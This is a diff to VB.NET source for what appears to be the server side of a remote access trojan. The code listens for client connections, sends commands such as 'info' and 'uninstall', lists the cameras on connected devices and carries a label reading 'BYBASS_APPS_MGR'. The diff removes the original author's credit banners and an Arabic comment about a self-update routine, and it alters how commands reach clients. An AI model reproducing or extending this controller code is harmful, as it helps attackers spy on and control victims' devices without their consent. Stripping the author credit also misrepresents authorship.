@@ -3,13 +3,7 @@ Imports System.Security.Cryptography
 Imports System.Management
 Imports RestSharp
 Imports System.Net
-'##################################################
-'################### CODED  #######################
-'##################### BY #########################
-'############### Saher Blue Eagle  ################
-'###############  XPR OPEN SOURCE  ################
-'##################################################
-'##################################################
+
 Public Class Form1
 
 
@@ -161,8 +155,8 @@ SRELINE:    port = Integer.Parse(InputBox("Enter port to listen", "Port Entry [N
     End Sub
 
     Private Sub Connected_client(ByVal sock As Integer) Handles Server.Connected
-        Server.Send(sock, "info" & SplitData)
-        'Server.Send_DX(sock, "info" & SplitData)
+        'Server.Send(sock, "info" & SplitData)
+        Server.Send_DX(sock, "info" & SplitData & vbNewLine & "info" & SplitData) 'test failed
         '
         ListBox1.Items.Add("New connection : " & Server.IP(sock))
         'Server.Send(sock, "Send_info" & SplitData) fail
@@ -1360,7 +1354,7 @@ REshowLINE:
                                     For Each Cam_DRV As String In CamDrives_Ary
                                         If Cam_DRV.Contains(split_Ary) Then
                                             Cam_DRV = Cam_DRV.Replace(split_Ary, "")
-                                            ' Aroid.ComboBox1.Items.Add(Cam_DRV)
+                                            Aroid.ComboBox1.Items.Add(Cam_DRV)
                                         End If
                                     Next
                                 End Try
@@ -2226,9 +2220,7 @@ BYBASS_APPS_MGR:
 
     End Function
     Dim ifsent As Boolean = False
-    Private Sub checkgithub() 'online update for version
-        'جزء للتطوير فى السورس تجعله يقوم بعمل تحديث لنفسه من مكتبة الجيتهب الخاصة بك 
-        ' يمكن ازالته و لن يؤثر على تشغيل البرنامج 
+    Private Sub checkgithub()
         On Error Resume Next
         If ifsent = True Then
             Exit Sub
@@ -2440,7 +2432,7 @@ BYBASS_APPS_MGR:
 
     Private Sub EndConnectionToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EndConnectionToolStripMenuItem1.Click
         For Each item As ListViewItem In client_list_l1.SelectedItems
-            Server.Send_DX(item.ToolTipText, "uninstall" & SplitData & "-1") '  Server.Send_DX(item.ToolTipText, "c_close")
+            Server.Send_DX(item.ToolTipText, "c_close")
         Next
     End Sub
 
@@ -2621,13 +2613,7 @@ RESLINE:
         End If
     End Sub
 End Class
-'##################################################
-'################### CODED  #######################
-'##################### BY #########################
-'############### Saher Blue Eagle  ################
-'###############  XPR OPEN SOURCE  ################
-'##################################################
-'##################################################
+
 Public Class CRDP
     Shared OA As New List(Of Bitmap)
     Shared OAA As New List(Of Point)
